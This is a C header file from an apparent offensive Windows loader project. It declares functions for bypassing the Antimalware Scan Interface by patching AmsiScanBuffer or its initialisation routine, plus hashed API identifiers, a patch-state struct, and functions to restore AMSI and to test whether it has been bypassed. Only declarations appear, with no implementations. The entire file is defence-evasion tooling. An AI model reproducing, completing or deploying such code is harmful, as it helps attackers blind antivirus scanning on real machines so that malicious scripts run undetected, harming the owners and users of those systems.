#pragma once

/*
 * AmsiBypass.h - AMSI (Antimalware Scan Interface) Bypass
 *
 * Provides functionality to bypass AMSI scanning by patching
 * the AmsiScanBuffer function in amsi.dll.
 */

#include <windows.h>
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "StringCrypt.h"

// AMSI function hash definitions
#define HASH_LIB_AMSI                0x19c0c5b9  // "amsi.dll"
#define HASH_FUNC_AMSISCANBUFFER     0x314a6c8   // "AmsiScanBuffer"
#define HASH_FUNC_AMSIINITIALIZE     0x7b8c4e2a  // "AmsiInitialize"
#define HASH_FUNC_AMSIUNINITIALIZE   0x4e7c0e1f  // "AmsiUninitialize"
#define HASH_FUNC_AMSIOPENSESSION    0x7d8a0f2b  // "AmsiOpenSession"

// AMSI bypass status
typedef struct _AMSI_BYPASS_STATE {
    BOOL    bIsBypassed;
    PVOID   pOriginalBytes;
    SIZE_T  patchSize;
    PVOID   pAmsiScanBuffer;
    HMODULE hAmsiModule;
} AMSI_BYPASS_STATE, *PAMSI_BYPASS_STATE;

// Global AMSI bypass state
extern AMSI_BYPASS_STATE g_AmsiBypassState;

// Function declarations

/**
 * Bypass AMSI by patching AmsiScanBuffer
 * @return TRUE if bypass was successful, FALSE otherwise
 */
BOOL BypassAMSI();

/**
 * Bypass AMSI using alternative method (patch return value)
 * @return TRUE if bypass was successful, FALSE otherwise
 */
BOOL BypassAMSIReturn();

/**
 * Bypass AMSI by patching the initialization function
 * @return TRUE if bypass was successful, FALSE otherwise
 */
BOOL BypassAMSIInit();

/**
 * Restore original AMSI functionality
 * @return TRUE if restore was successful, FALSE otherwise
 */
BOOL RestoreAMSI();

/**
 * Check if AMSI bypass is currently active
 * @return TRUE if bypassed, FALSE otherwise
 */
BOOL IsAMSIBypassed();

/**
 * Get AMSI module handle using dynamic resolution
 * @return Handle to amsi.dll or NULL if not found
 */
HMODULE GetAmsiModule();

/**
 * Get AmsiScanBuffer function address
 * @return Address of AmsiScanBuffer or NULL if not found
 */
PVOID GetAmsiScanBufferAddr();

// Internal helper functions
BOOL PatchAmsiScanBuffer();
BOOL PatchAmsiScanBufferHell();
BOOL RemoveAmsiHook();

/**
 * Perform AMSI scan simulation test
 * @return TRUE if AMSI would block a test string, FALSE if bypassed
 */
BOOL TestAMSIBypass();